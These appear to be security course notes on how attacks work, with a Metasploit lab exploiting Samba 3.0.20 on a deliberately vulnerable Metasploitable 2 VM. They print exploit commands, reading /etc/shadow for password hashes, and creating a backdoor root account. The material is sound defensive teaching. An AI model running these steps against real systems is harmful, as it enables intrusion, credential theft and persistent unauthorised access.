# System Security — Session 4: Understanding Attacks

---

## Why Study Attacks as a Defender?

> "To be a good defender, we must understand the attacker."

Understanding *how* attacks work makes defence decisions logical rather than arbitrary. Each defence maps directly to a specific attack method.

---

## How Most Attacks Actually Start

| Rank | Attack vector | % of breaches |
|---|---|---|
| #1 | User clicks malicious email link | 85–95% |
| #2 | Exploiting unpatched vulnerabilities | remaining |

**The #1 attack is not a technical problem — it's a human behaviour problem.**

A malicious email link installs malware (e.g. a reverse shell/terminal) on the victim's machine. The attacker now has a foothold *inside* the company network, behind the firewall. From there, they can scan and attack internal systems that were never exposed to the internet.

---

## Key Concepts

**Exploit** — a program that takes advantage of a known vulnerability in a target application to achieve a desired effect (e.g. remote code execution, privilege escalation).

**Vulnerability** — a bug in software that can be exploited. Age doesn't matter — a 5-year-old unpatched vulnerability is just as exploitable as a new one.

**Payload** — what the exploit delivers once it runs (e.g. a reverse shell, a new user account, data exfiltration).

**CVE** — Common Vulnerabilities and Exposures. Publicly documented vulnerabilities with assigned IDs. Searchable at `cvedetails.com` and `nvd.nist.gov`.

---

## Lab Setup

| Machine | Role | Tool |
|---|---|---|
| Kali Linux | Attacker toolbox | Metasploit, Nmap |
| Metasploitable 2 | Victim — intentionally unpatched Linux from 2012 | Many vulnerable services |

Both run as VMware VMs on a Host-Only network (isolated from the internet).

**Get Metasploitable 2:**
- https://sourceforge.net/projects/metasploitable/
- Apple ARM: use UTM emulator

---

## Attack Walkthrough — Gaining Root via Samba

### Step 1: Find hosts
```bash
# From Kali — discover live hosts on the lab network
nmap -vv -n -sn -T4 192.168.64.0/24
```

### Step 2: Scan target for open services
```bash
nmap -vv -Pn -sS -A 192.168.64.2
# -A = OS detection + version detection + scripts
```
→ Many services visible. Pick one to investigate: **Samba** (SMB file sharing).

### Step 3: Identify exact version with Metasploit
```bash
msfconsole

search scanner/smb
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 192.168.64.2
exploit
```
→ Returns: **Samba 3.0.20 Debian**

### Step 4: Research the vulnerability
- Search `cvedetails.com` for "Samba 3.0.20"
- Find: **username map script** — a command injection vulnerability in Samba's username handling

### Step 5: Find and run the exploit
```bash
search samba
use exploit/multi/samba/usermap_script
show options
set RHOSTS 192.168.64.2
exploit
```
→ Returns a root shell on the target

### Step 6: Use the access
```bash
whoami          # → root
id
ls
less /etc/shadow          # steal all password hashes
netstat                   # see all network connections
adduser niceguy           # create backdoor account
# add niceguy to root/admin group for persistent access
shutdown 0                # or just cause damage
```

---

## The Full Attack Flow (Summary)

```
1. Phishing email → user clicks → malware installed → foothold inside network
2. Scan internal network → find hosts
3. Scan hosts → find open services
4. Research services → find known CVEs
5. Search Metasploit for matching exploit module
6. Set options (RHOSTS, payload, etc.) → run exploit
7. Use gained access (steal data, create backdoor, escalate, pivot)
```

**Defence against this entire chain:** user awareness training (stops step 1), patching (stops step 5), network segmentation (limits step 2), IDS/IPS (detects steps 2–6).

---

## Other Attack Vectors

### Default / Weak Passwords
- Devices/servers shipped with empty or factory default passwords
- Admins forget to change them or use trivial passwords
- **Defence:** always change default credentials, use strong passwords, document in a safe location, use 2FA or certificate-based auth where possible

### IP Spoofing
- Attacker crafts packets that appear to come from a trusted internal IP
- **Defence:** packet filtering, traffic analysis, ingress/egress filtering

### Phone Spoofing / Social Engineering
- Attacker calls appearing to be from a trusted internal number
- **Defence:** user awareness, callback verification procedures

### Eavesdropping / Man-in-the-Middle (MitM)
- Attacker intercepts data in transit between two nodes
- Most effective with fake WiFi access points
- Protocols vulnerable in plaintext: Telnet, FTP, HTTP, VoIP, unencrypted email
- **Defence:** encryption (TLS/HTTPS/SSH), strong authentication, avoid connecting to unknown WiFi

### Data Theft from Systems
- Direct disk copy (physical access)
- Steal credentials → log in → copy data
- SQL injection → extract database contents
- **Defence:** full disk encryption, input validation/sanitisation, strong authentication

### Software Vulnerabilities
- Unpatched bugs exploited (as demonstrated above)
- **Defence:** regular patching and updates — this is the primary control

### Denial of Service (DoS)
- Flood a service with more requests than it can handle
- Or send specially crafted requests that are computationally expensive / crash the service
- **Defence:** traffic analysis, rate limiting, packet filtering, load balancing

### Attacking Mobile Devices
- Malicious "free" app steals credentials or installs a keylogger
- Attacker uses stolen credentials to access company systems
- **Defence:** traffic analysis, company-managed devices and apps, MDM (Mobile Device Management)

---

## Exercises — Session 4

**4.1 — Metasploit attack lab:**
```bash
# On Kali, with Metasploitable 2 running on same host-only network

# 1. Find Metasploitable's IP
nmap -vv -n -sn -T4 192.168.X.0/24

# 2. Full service scan
nmap -vv -Pn -sS -A <target_ip>

# 3. In msfconsole
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS <target_ip>
exploit

# 4. Run the exploit
use exploit/multi/samba/usermap_script
set RHOSTS <target_ip>
exploit

# 5. Once inside (as root):
whoami
less /etc/shadow          # download this = stolen pw hashes
adduser niceguy
usermod -aG sudo niceguy  # or: usermod -aG root niceguy
```

**4.2 — Extra exploits:**
- Try other open ports from the Nmap scan (FTP on 21, MySQL on 3306, etc.)
- Search Metasploit: `search ftp` or `search vsftpd`
- Look up the service version on `cvedetails.com` → find a matching module → run it
- Goal: understand that the *workflow is always the same*, regardless of which service is targeted

---

## Key Concepts for Exam

- **85–95% of breaches start with phishing** — the human is the weakest link, not the technology
- **An exploit works as long as the target is unpatched** — age of the vulnerability is irrelevant
- **Metasploit** is a framework that organises exploits as modules: `search` → `use` → `show options` → `set` → `exploit`
- **The attack workflow is always the same:** foothold → discover → research → exploit → use access
- **Every attack vector has a corresponding defence** — understand the attack to choose the right defence
- **Patching is the #1 technical defence** against vulnerability exploitation
- **Disk encryption + strong auth + input validation** defend against data theft
- **User awareness** is the only defence against phishing — technical controls alone cannot stop it